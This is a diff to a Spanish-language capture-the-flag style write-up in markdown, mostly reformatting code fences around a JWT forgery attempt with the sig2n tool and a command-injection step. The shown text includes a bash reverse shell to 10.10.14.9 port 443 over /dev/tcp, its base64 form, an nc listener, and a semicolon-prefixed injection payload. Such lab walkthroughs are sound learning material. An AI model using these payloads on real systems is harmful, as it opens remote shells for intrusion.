@@ -223,10 +223,10 @@ docker run --rm -it portswigger/sig2n <token1> <token2>
 
 ```bash
 docker run --rm -it portswigger/sig2n eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MmJiNDg2NjcwYjNkZTA0NjBlMTI5ZDgiLCJuYW1lIjoicGVwaXRvIiwiZW1haWwiOiJwZXBpdG9AcGVwaXRvLmVzIiwiaWF0IjoxNjU2NDQyNjczfQ.Otks_fVahBvM6qlhwHMTpaAbpWSorNyS41hD7wIk1_c eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MmJiNjRhMzcwYjNkZTA0NjBlMTI5ZTAiLCJuYW1lIjoicGVwaXRvMiIsImVtYWlsIjoicGVwaXQyb0BwZXBpdG8uZXMiLCJpYXQiOjE2NTY0NDgyNTR9.bxUClMgtmQz7zZhgCyxf_Te69-XF5gFGxzAkYF3zdVw
-```
+
   File "jwt_forgery.py", line 59, in <module>
     raise Exception("Not RSA signed tokens!")
-
+```
 Por lo que no funciona. Una vez llegado a este punto voy a revisar por encima el código que nos descargamos antes.
 
 Lo primero que puedo ver es que hay un github. Por experiencia puede haber cosas interesantes.
@@ -270,7 +270,7 @@ Siempre con el token que obtuvimos antes , cambiamos la url GET http://localhost
 
 Vemos que efectivamente conseguimos que nos haga un ping
 
-
+```bash
 echo "bash -c 'bash -i >& /dev/tcp/10.10.14.9/443 0>&1'" | base64
 
 YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC45LzQ0MyAwPiYxJwo=
@@ -281,7 +281,7 @@ nc -nlvp 443
 you should encode this as %2b.
 
 ;YmFzaCAtYyAnYmFzaCAtaSA%2bJiAvZGV2L3RjcC8xMC4xMC4xNC45LzQ0MyAwPiYxJwo=
-
+```
 ![](2022-06-28-23-20-28.png)
 
 Hemos visto que funciona, vamos a hacer la misma petición desde curl escuchando por icmp
